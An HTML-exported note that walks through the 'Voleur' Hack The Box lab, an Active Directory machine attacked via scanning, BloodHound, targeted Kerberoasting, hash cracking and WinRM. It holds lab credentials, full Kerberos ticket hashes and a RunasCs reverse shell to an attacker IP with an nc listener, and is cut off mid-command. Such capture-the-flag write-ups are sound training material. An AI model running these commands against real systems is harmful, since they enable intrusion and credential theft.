
<!DOCTYPE html>
<html lang="en_US" data-theme-mode="dark" data-light-theme="daylight" data-dark-theme="midnight">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="stylesheet" type="text/css" id="baseStyle" href="stage/build/export/base.css?v=3.1.32"/>
    <link rel="stylesheet" type="text/css" id="themeDefaultStyle" href="appearance/themes/midnight/theme.css?v=3.1.32"/>
    <script src="stage/protyle/js/protyle-html.js?v=3.1.32"></script>
    
    <title>Voleur</title>
    <!-- Exported by SiYuan v3.1.32 -->
    <style>
        body {font-family: var(--b3-font-family);background-color: var(--b3-theme-background);color: var(--b3-theme-on-background)}
        @font-face {
  font-family: "Emojis Reset";
  src: url(../../../appearance/fonts/Noto-COLRv1-2.047/Noto-COLRv1.woff2) format("woff2");
  unicode-range: U+1f170-1f171, U+1f17e, U+1f17f, U+1f21a, U+1f22f, U+1f232-1f23a, U+1f250, U+1f251, U+1f32b, U+1f3bc,
  U+1f411, U+1f42d, U+1f42e, U+1f431, U+1f435, U+1f441, U+1f4a8, U+1f4ab, U+1f525, U+1f600-1f60d, U+1f60f-1f623,
  U+1f625-1f62b, U+1f62d-1f63f, U+1F643, U+1F640, U+1f79, U+1f8f, U+1fa79, U+1fae4, U+1fae9, U+1fac6, U+1fabe, U+1fadf,
  U+200d, U+203c, U+2049, U+2122, U+2139, U+2194-2199, U+21a9, U+21aa, U+23cf, U+25aa, U+25ab, U+25b6, U+25c0, U+25fb-25fe,
  U+2611, U+2615, U+2618, U+261d, U+2620, U+2622, U+2623, U+2626, U+262a, U+262e, U+2638-263a, U+2640, U+2642, U+2648-2653,
  U+265f, U+2660, U+2663, U+2665, U+2666, U+267b, U+267e, U+267f, U+2692-2697, U+2699, U+269b, U+269c, U+26a0, U+26a1,
  U+26a7, U+26aa, U+26ab, U+26b0, U+26b1, U+2702, U+2708, U+2709, U+270c, U+270d, U+2712, U+2714, U+2716, U+271d, U+2733,
  U+2734, U+2744, U+2747, U+2763, U+2764, U+2934-2935, U+3030, U+303d, U+3297, U+3299, U+fe0f, U+e50a, U+a9, U+ae;
  size-adjust: 92%;
}
@font-face {
  font-family: "Emojis";
  src: url(../../../appearance/fonts/Noto-COLRv1-2.047/Noto-COLRv1.woff2) format("woff2"),
  local("Segoe UI Emoji"),
  local("Segoe UI Symbol"),
  local("Apple Color Emoji"),
  local("Twemoji Mozilla"),
  local("Noto Color Emoji"),
  local("Android Emoji"),
  local("EmojiSymbols");
  size-adjust: 92%;
}
:root{--b3-font-size-editor:16px}
.b3-typography code:not(.hljs), .protyle-wysiwyg span[data-type~=code] { font-variant-ligatures: none }
.li > .protyle-action {height:34px;line-height: 34px}
/* 列表项后的内容和列表项对齐 https://github.com/siyuan-note/siyuan/issues/2803 */
.protyle-wysiwyg [data-node-id].li > .protyle-action ~ div {line-height:26px}
.protyle-wysiwyg [data-node-id].li > .protyle-action ~ div > [spellcheck] {min-height:26px}
.protyle-wysiwyg [data-node-id].li::before {height: calc(100% - 38px);top:38px}

.protyle-wysiwyg [data-node-id] {}
.protyle-wysiwyg .li {min-height:34px}
.protyle-gutters button svg {height:26px}
        
        
    </style>
</head>
<body>
<div class="protyle-wysiwyg protyle-wysiwyg--attr" 
style="max-width: 800px;margin: 0 auto;" 
id="preview"><div data-subtype="h1" data-node-id="20250706103419-pcbacap" data-type="NodeHeading" class="h1" icon="anatine.png" id="20250706103419-pcbacap" title="Voleur" updated="20250706210243"><div contenteditable="false" spellcheck="false">Voleur</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706224140-scaupqu" data-type="NodeParagraph" class="p" id="20250706224140-scaupqu" updated="20250706224202"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706224202-6hlt0f9.png" data-src="assets/image-20250706224202-6hlt0f9.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706103517-37818h1" data-type="NodeParagraph" class="p" id="20250706103517-37818h1" updated="20250706205836"><div contenteditable="false" spellcheck="false">First things first, you gotta know what you're dealing with. We ran a quick but deep nmap scan to see what doors were open on the machine.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205203-8kf8lsg" data-type="NodeParagraph" class="p" id="20250706205203-8kf8lsg" updated="20250706205203"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706103419-uokfahn" data-type="NodeCodeBlock" class="code-block" id="20250706103419-uokfahn" updated="20250706103459"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">command</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">nmap -sCV -p- 10.10.11.76 -Pn -oN nmap_result --min-rate=5000
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706103447-tzzh6v2" data-type="NodeParagraph" class="p" id="20250706103447-tzzh6v2" updated="20250706103447"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205911-gv7s528" data-type="NodeParagraph" class="p" id="20250706205911-gv7s528" updated="20250706205911"><div contenteditable="false" spellcheck="false">The results basically screamed &quot;Domain Controller!&quot; We saw all the usual suspects: DNS (port 53), Kerberos (port 88), SMB (port 445), and LDAP (port 389). This confirmed we were up against a full-blown Active Directory environment.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205911-zljq0eu" data-type="NodeParagraph" class="p" id="20250706205911-zljq0eu" updated="20250706205911"><div contenteditable="false" spellcheck="false">Two things stood out, though:</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="o" data-node-id="20250706205911-lm0yps9" data-type="NodeList" class="list" id="20250706205911-lm0yps9" updated="20250706205911"><div data-marker="1." data-subtype="o" data-node-id="20250706205911-q5qoz07" data-type="NodeListItem" class="li" id="20250706205911-q5qoz07" updated="20250706205911"><div class="protyle-action protyle-action--order" contenteditable="false" draggable="true">1.</div><div data-node-id="20250706205911-e8msjim" data-type="NodeParagraph" class="p" id="20250706205911-e8msjim" updated="20250706205911"><div contenteditable="false" spellcheck="false"><span data-type="strong">Port 2222 was open with SSH.</span> This is a bit unusual for a Windows DC and hinted that maybe Windows Subsystem for Linux (WSL) was set up. We filed that away for later.</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-marker="2." data-subtype="o" data-node-id="20250706205911-k3zzhrd" data-type="NodeListItem" class="li" id="20250706205911-k3zzhrd" updated="20250706205911"><div class="protyle-action protyle-action--order" contenteditable="false" draggable="true">2.</div><div data-node-id="20250706205911-4fzu6z8" data-type="NodeParagraph" class="p" id="20250706205911-4fzu6z8" updated="20250706205911"><div contenteditable="false" spellcheck="false"><span data-type="strong">Port 5985 was open for WinRM.</span> This is our go-to for getting a remote shell if we can get credentials.</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205220-5ye75rl" data-type="NodeParagraph" class="p" id="20250706205220-5ye75rl" updated="20250706205224"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706103507-pg3yu1f" data-type="NodeCodeBlock" class="code-block" id="20250706103507-pg3yu1f" updated="20250706103619"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-06 12:58:59Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706103606-xi35pbx" data-type="NodeParagraph" class="p" id="20250706103606-xi35pbx" updated="20250706103606"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706205932-z7o83r4" data-type="NodeHeading" class="h3" id="20250706205932-z7o83r4" updated="20250706210216"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 2: Finding the First Weak Link (Kerberoasting)</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706205932-vl073qg" data-type="NodeParagraph" class="p" id="20250706205932-vl073qg" updated="20250706205932"><div contenteditable="false" spellcheck="false">Since we were in an &quot;Assumed Breach&quot; scenario, we started with a user's credentials (<span data-type="code">ryan.naylor</span>​). The first thing to do in any AD environment is to map it out. We used <span data-type="code">BloodHound</span>​ for this.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706193908-shlhd64" data-type="NodeParagraph" class="p" updated="20250706193908" id="20250706193908-shlhd64"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706193908-tnk2ucj" data-type="NodeCodeBlock" class="code-block" updated="20250706193909" id="20250706193908-tnk2ucj"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">bloodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.10.11.76 --zip -k
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706193911-dxranjh" data-type="NodeParagraph" class="p" id="20250706193911-dxranjh" updated="20250706193911"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706193934-cg88jti" data-type="NodeParagraph" class="p" updated="20250706193934" id="20250706193934-cg88jti"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706193934-7h9vuda.png" data-src="assets/image-20250706193934-7h9vuda.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210013-ppqxxir" data-type="NodeParagraph" class="p" id="20250706210013-ppqxxir" updated="20250706210045"><div contenteditable="false" spellcheck="false">BloodHound drew us a beautiful map of the domain, and sure enough, it pointed out a classic weak spot: a &quot;kerberoastable&quot; user named <span data-type="code">svc_ldap</span>​.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706194059-pqo7wd9" data-type="NodeParagraph" class="p" updated="20250706194059" id="20250706194059-pqo7wd9"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706194056-w7dm6c3" data-type="NodeCodeBlock" class="code-block" id="20250706194056-w7dm6c3" updated="20250706194057"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">impacket-getTGT VOLEUR.HTB/svc_ldap:'M1XyC9pW7qT5Vn' -dc-ip 10.10.11.76
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706194058-ny61i2l" data-type="NodeParagraph" class="p" id="20250706194058-ny61i2l" updated="20250706194058"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706194115-9lnj8uj" data-type="NodeParagraph" class="p" id="20250706194115-9lnj8uj" updated="20250706194115"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706194115-6plxbaz.png" data-src="assets/image-20250706194115-6plxbaz.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706194116-1yhsmh1" data-type="NodeParagraph" class="p" id="20250706194116-1yhsmh1" updated="20250706210147"><div contenteditable="false" spellcheck="false">In simple terms, this means we could ask the domain for a special ticket for that service account. The ticket is encrypted with the account's own password hash. We can take that ticket offline and try to crack the password without ever alerting the system.</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210149-qle0jvo" data-type="NodeParagraph" class="p" id="20250706210149-qle0jvo" updated="20250706210149"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195015-h2qqypx" data-type="NodeCodeBlock" class="code-block" id="20250706195015-h2qqypx" updated="20250706195022"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">python3 targetedKerberoast/targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195020-v5koc6m" data-type="NodeParagraph" class="p" id="20250706195020-v5koc6m" updated="20250706195122"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span style="width: 1156px;"><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706195122-csggnip.png" data-src="assets/image-20250706195122-csggnip.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195024-xtnvy45" data-type="NodeCodeBlock" class="code-block" id="20250706195024-xtnvy45" updated="20250706195136"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">[+] Printing hash for (lacey.miller)
$krb5tgs$23$*lacey.miller$VOLEUR.HTB$voleur.htb/lacey.miller*$3391085fe15e0d83c21227f1390235c7$c19799130f8db72d599e918c61ddd7b529da600e1cd77f0816cde29e0ae8445b53f2ad2976ece099e3b6fcbace20952aa1962a37e17c9bdd389bc687d95a2f605b780b4d8ba812f3a8d0e00dde8efbfe601bb8c6c60081879970300b509ec77cc63e64581a6c12f183c4b787d0f730666f0fa743e9a95954c1e9861a0d913d3a69dd222adb019caba6c79c44f1c28b4aeb463d9cf8ec0c08f216f91849c83753af3f20de1ce72b098c94a03cd8e9939699f4bca32f3488f06b79fd36c6975db93b5ce641effa5d2a694ae2dc65b2f34a9535e7876a56367738431287aea0a3cbd1ce7270fb66c7b3bab98802103a66981b6322e31f6b7a80fe7e4594cc9b2d90faa49cde51d2da7ba02385c77f836128d60168f18ad654d945e037d6c397264846313e0386d952f98e65aa6851802d8f2facd0509ff1f6d6afdd4a5cb29a398144d896765117b0eaa2217723b60e54bef9062c5827225c057177e671c3ff28d3dbff3fff4477f1d5301ed112218ce9c0933e41705aaa3254c4bfd07cfedbca8317d1dcd1b09eff2be4f5337f44825aead7a7c291445bab0939560e44d8ef5d863975dc268695f12a5a9b2c54c47a8a5b62568121967a09b4b8553bd8a32f1d3b632abc4dd7fe0a106f277d0160ed897add0708e81df2c831d6561e9bdb2ffd420bb24be7302324e264b28293e3bfe93492365206e73d34d5e534164c46c98f3d2fe4156fbe8a8258a699769e3bcdf7200f4c157d0ad8d55033728090567ae64b4c934cc64bec11ee46bc9767bfc7565f4d9325a19838a50f98797676a48039b838606867985c117e07c7f161d39e915c2ac5db85dd478674f2c757074eba6bfeff03486a282f95d730b2a60447fdc4f16434a48fdf0fa32d988938cdb0d18704fc1fd4156b95ac9b228d7fc670da2be65156555569e11ec948ed21b97f1eef9d9223ad459b5be5d4aa6c55bd7381cc1e7f653f8fa752ff66d92aa9e31536c9eae0624846f8ce5cdbe97e6d2353ddf040efee5a9ae2e1b0cceafa51188afaff86f2cafc7936c15737d62c41214eb84baa210580ff45febc1ed5852b7504d856aea4b3c8128b935023ad292716d7e6b13840492d0016798d9585638163a457ef3baeedf309532a80bfe63325788c22c764213a6419f540fd847ae1429ef59de8ee6fb2bb5930f550413dc52195ae7efa82781c4c5da06118f0af335805b11fd22a0ab110a3e06c48620ba3da2a68b3d32d336f54b5260d47bc90a0e3df1c7db98f5abf906eb60188fb36fdbfd82eb2fc9c946013651ad9522532cd99fb80a8a21abbbb5cbc8f2f66771b380a85d2e463a53629c6de701648c80c8627fded3bde4384b3aea509ec45f3f5c0d99a1a9db683a2a98a17884500f968b423a3f4e743cbf6f51c11b0f6947a9043ca0b2428ff08cc89eddb35db02ee1c954142c49b471185c3de4e476192c095e85e902bc6d4a15fe342
[+] Printing hash for (svc_winrm)
$krb5tgs$23$*svc_winrm$VOLEUR.HTB$voleur.htb/svc_winrm*$15a80dcd49a90a2813e4deea5ec1ca03$9bb4a6f3e17e82829d9cb9bcdbd9fd12458f8ad89a99ecaef63e2b3c37880d5f3cb60964a5ac466c55a11b7fa7cde5f0f08b003ae804a7dd997a9370f8aefea6fb983ad7c3c715df4343e358b2c25a5938ed05bcce542f0beb71dbf0daded672a1bdde468aba1d3fa2286f3f9d4d33cfeb1c151e4f279650dbfdbc8c694fe148a1da08eb3b0e5cf32338cd653ef338e80537fab0e232dd65eee94a3529b782a76704a52abf4a423f45e215a9c48ed735243541e9f975683c99736aa7ef4ce7a17ea69314d69e6c916884660106ec85e8126017c1195a9cdc5eae1b5e7346c15be05b3500c487b40a900aacd96001dc8d904a4697023145ae28dda4fb1f7ff6ea41e0982aad5d9b3f4e10795188097ac054b4a7829c5afe05184e67d5c9492bba6581d286973b980f63714461333a5345de8b888d8adf495f13d54783dbe513b3aa4159b621b4a1c32663b31890f9e0718e5f299dc087f6eecd49dc609a7ae138a7e4878e6537d6ef2fb11906a271cd5620655240afffd68d850b28b0710e8e78dec41d825685fee533325244b82c35783f1a0422a09b78daddfeab96ba2b9cf6c2822cfabef00b36efec030b8a17c38c246b97f391422f6f74461cf22333c385f7ea5f4828f1689f348f3e1ca6a713858557da07895dbd19f9d8090a02b97340f4ecc60c7237ab878779543ec0f073d553ff923074b02f59a58d8085592c5ba43d51d9cc64379e971d4089e900a6d95de50012c820d335a0cd764fca318b22ed2b37c1cd1a42f913e61b36429a0290f1de4e79fdc29e69e69482611888146937d8c71c0253d36a8378022f5613e16d8a8c711c9beb16dfd1d56471ce8376677434dd71719fc3117b6a9eeb11630ef725ffc8a0b63517348473989ab0233aff1b4d233754cffda8fa3969796ba9cecc6c4fbc75ade8980d92441e961578769ccc98349e48efaf11a98a5e8bd1721ac43ee7b63f6e1dad6b05baaa79e94a28ced9ccae27b13a7ba146e26724cdf4bde5404c7f09578a16f7f99e6dcfa335fe34b44a0d5c341efa2a1e1e081f83fea98c6174d32d4e0e9e2e4872038fb8919dc3f4a89b4bf4ff9c55cfd257ba5868e37bc48b67c09bbbee6b62f617be485601b9f1d1bc7bd516d03864b1f8f15c83a74f369d4d7b47eb71205f40687447c49ce1141ac018fd3d12b04644d619f4436985d0cae1b712b1d0364cb87239805f77e7281b56b28038246c70cfd41c2a118ec53615b7b2faaa2ad648696cc58cf7a4088f1d32bd8b2e02b6b0be648a7ce6dd728ad2a63a29fbcf211cee97ad301f6314247bee94e30c79e6360e61ecd0a8fee6d1928a5b61038593583ebca0247eef76f06d291fe7446dd00bdbf085da7d99c0310ce365d2b293279aafd9a48aee6747116bb7fa7481fc6b7630beaa278d4e0c80ab0ace263ba282b2ea51353f3813086adae098dd0cb5b0f853914b4c5f721822ad7b65
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195137-19b4x13" data-type="NodeParagraph" class="p" id="20250706195137-19b4x13" updated="20250706195137"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195709-eqz8twh" data-type="NodeParagraph" class="p" updated="20250706195732" id="20250706195709-eqz8twh"><div contenteditable="false" spellcheck="false">Cracked the hash.txt of <span data-type="code">svc_winrm</span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195733-5gvso9r" data-type="NodeCodeBlock" class="code-block" id="20250706195733-5gvso9r" updated="20250706195736"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">john hash.txt --wordlist=rockyou.txt
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195737-sxako9m" data-type="NodeParagraph" class="p" id="20250706195737-sxako9m" updated="20250706195737"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195805-3dbxrxh" data-type="NodeParagraph" class="p" id="20250706195805-3dbxrxh" updated="20250706195805"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706195805-ivigbot.png" data-src="assets/image-20250706195805-ivigbot.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-subtype="h3" data-node-id="20250706210217-8orvcxs" data-type="NodeHeading" class="h3" id="20250706210217-8orvcxs" updated="20250706210243"><div contenteditable="false" spellcheck="false"><span data-type="strong">Step 3: Cracking the Password and Getting In</span></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210217-dx79xkg" data-type="NodeParagraph" class="p" id="20250706210217-dx79xkg" updated="20250706210222"><div contenteditable="false" spellcheck="false">We took that hash, threw a big list of common passwords (rockyou.txt) at it using john, and... bingo!</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210228-lqu1qjq" data-type="NodeParagraph" class="p" id="20250706210228-lqu1qjq" updated="20250706210243"><div contenteditable="false" spellcheck="false">We got the password for:</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210232-7hyj5b2" data-type="NodeBlockquote" class="bq" id="20250706210232-7hyj5b2" updated="20250706210232"><div data-node-id="20250706210232-0a6nf20" data-type="NodeParagraph" class="p" updated="20250706210232" id="20250706210232-0a6nf20"><div contenteditable="false" spellcheck="false">svc<span data-type="backslash">_</span>winrm: AFireInsidedeOzarctica980219afi.</div><div class="protyle-attr" contenteditable="false"></div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706195836-lh216bz" data-type="NodeParagraph" class="p" updated="20250706195836" id="20250706195836-lh216bz"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706200452-j00nda9" data-type="NodeParagraph" class="p" id="20250706200452-j00nda9" updated="20250706200933"><div contenteditable="false" spellcheck="false">Now generating manual TGT of <span data-type="code">svc_winrm</span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706200926-xym5oyg" data-type="NodeCodeBlock" class="code-block" id="20250706200926-xym5oyg" updated="20250706201024"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706201025-540n9ix" data-type="NodeParagraph" class="p" id="20250706201025-540n9ix" updated="20250706201112"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706201125-fml66so" data-type="NodeParagraph" class="p" id="20250706201125-fml66so" updated="20250706201125"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706201123-q9tiznf.png" data-src="assets/image-20250706201123-q9tiznf.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706201113-58tsnm6" data-type="NodeCodeBlock" class="code-block" id="20250706201113-58tsnm6" updated="20250706210221"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn cmd.exe -r 10.10.16.47:4444
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210214-pfk25wj" data-type="NodeParagraph" class="p" updated="20250706210214" id="20250706210214-pfk25wj"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210230-9pbc1xn" data-type="NodeCodeBlock" class="code-block" id="20250706210230-9pbc1xn" updated="20250706210232"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">ports</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">rlwrap -f . -r nc -lvnp 4444
</div></div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210230-p8zp4v0" data-type="NodeParagraph" class="p" updated="20250706210230" id="20250706210230-p8zp4v0"><div contenteditable="false" spellcheck="false">​<span contenteditable="false" data-type="img" class="img"><span> </span><span><span class="protyle-action protyle-icons"><span class="protyle-icon protyle-icon--only"><svg class="svg"><use xlink:href="#iconMore"></use></svg></span></span><img src="assets/image-20250706210214-f3s31gb.png" data-src="assets/image-20250706210214-f3s31gb.png" alt="image" /><span class="protyle-action__drag"></span><span class="protyle-action__title"><span></span></span></span><span> </span></span>​</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210223-vq81a23" data-type="NodeParagraph" class="p" updated="20250706210638" id="20250706210223-vq81a23"><div contenteditable="false" spellcheck="false">This PowerShell command lists <span data-type="strong">all deleted user accounts</span> in Active Directory, and shows:</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210638-bbmrpbe" data-type="NodeParagraph" class="p" id="20250706210638-bbmrpbe" updated="20250706210638"><div contenteditable="false" spellcheck="false">‍</div><div class="protyle-attr" contenteditable="false"></div></div><div data-node-id="20250706210650-nrh3h88" data-type="NodeCodeBlock" class="code-block" id="20250706210650-nrh3h88" updated="20250706210655"><div class="protyle-action"><span class="protyle-action--first protyle-action__language" contenteditable="false">powershell</span><span class="fn__flex-1"></span><span class="protyle-icon protyle-icon--only protyle-action__copy"><svg><use xlink:href="#iconCopy"></use></svg></span></div><div class="hljs"><div></div><div contenteditable="false" style="flex: 1" spellcheck="false">Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq 